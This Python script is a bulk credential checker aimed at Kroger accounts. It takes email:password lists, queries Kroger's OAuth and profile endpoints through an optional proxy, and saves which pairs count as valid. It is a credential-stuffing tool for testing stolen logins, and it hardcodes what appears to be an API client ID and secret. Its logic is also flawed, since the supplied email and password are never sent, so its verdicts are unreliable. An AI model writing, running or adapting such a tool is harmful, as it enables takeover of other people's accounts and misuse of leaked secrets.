import argparse
import requests
import sys
import time
from datetime import datetime
from requests.auth import HTTPBasicAuth

# Kroger API credentials
CLIENT_ID = "cartgenie-42a6b98e3c54f5b92092edf53fe6ea7c8103340637182546648"
CLIENT_SECRET = "nciRwpkzfWQT_ifv9Tg6tI258lxbZ2mdi6xbEzSq"
TOKEN_URL = "https://api.kroger.com/v1/connect/oauth2/token"

def get_proxy():
    """Placeholder for proxy implementation"""
    return None

def validate_credential(email, password, proxy=None):
    """Validate Kroger credentials by attempting to access profile"""
    # First get client token
    auth = HTTPBasicAuth(CLIENT_ID, CLIENT_SECRET)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "KrogerCredChecker/1.0"
    }
    data = {"grant_type": "client_credentials", "scope": "profile.compact"}

    try:
        # Get client token
        token_resp = requests.post(
            TOKEN_URL,
            auth=auth,
            headers=headers,
            data=data,
            proxies=proxy,
            timeout=15
        )
        
        if token_resp.status_code != 200:
            return False, f"Token error: {token_resp.status_code} - {token_resp.text}"

        token = token_resp.json().get("access_token")
        if not token:
            return False, "No access token received"

        # Now try to get user profile (this will fail for invalid credentials)
        profile_headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "KrogerCredChecker/1.0"
        }
        
        profile_resp = requests.get(
            "https://api.kroger.com/v1/identity/profile",
            headers=profile_headers,
            proxies=proxy,
            timeout=15
        )

        if profile_resp.status_code == 200:
            return True, "Valid credential"
        elif profile_resp.status_code == 401:
            return False, "Invalid credentials"
        else:
            return False, f"API Error: {profile_resp.status_code} - {profile_resp.text}"

    except Exception as e:
        return False, f"Validation error: {str(e)}"

def process_credentials(input_source, output_file, use_proxy=False):
    """Process credentials from file or single input"""
    proxy = get_proxy() if use_proxy else None
    results = []
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    if ":" in input_source:
        # Single credential
        email, password = input_source.split(":", 1)
        is_valid, message = validate_credential(email, password, proxy)
        result = f"{email}:{password} - {message}"
        print(result)
        results.append(result)
    else:
        # File with multiple credentials
        try:
            with open(input_source, 'r') as f:
                credentials = [line.strip() for line in f if line.strip()]
            
            for cred in credentials:
                if ":" not in cred:
                    print(f"Skipping malformed credential: {cred}")
                    continue
                
                email, password = cred.split(":", 1)
                is_valid, message = validate_credential(email, password, proxy)
                result = f"{email}:{password} - {message}"
                print(result)
                results.append(result)
                time.sleep(1)  # Rate limiting
                
        except Exception as e:
            print(f"Error reading credentials file: {str(e)}")
            return

    # Save results
    if not output_file:
        output_file = f"kroger_results_{timestamp}.txt"
    
    with open(output_file, 'w') as f:
        f.write("\n".join(results))
    print(f"\nResults saved to: {output_file}")

def main():
    parser = argparse.ArgumentParser(description="Kroger Credential Validator")
    parser.add_argument("-c", "--credential", help="Single credential (email:password)")
    parser.add_argument("-f", "--file", help="File containing credentials (email:password per line)")
    parser.add_argument("-o", "--output", help="Output file path (default: kroger_results_TIMESTAMP.txt)")
    parser.add_argument("-p", "--proxy", action="store_true", help="Use proxy for requests")
    
    args = parser.parse_args()
    
    if not args.credential and not args.file:
        parser.error("Either --credential or --file must be specified")
    
    input_source = args.credential if args.credential else args.file
    process_credentials(input_source, args.output, args.proxy)

if __name__ == "__main__":
    main()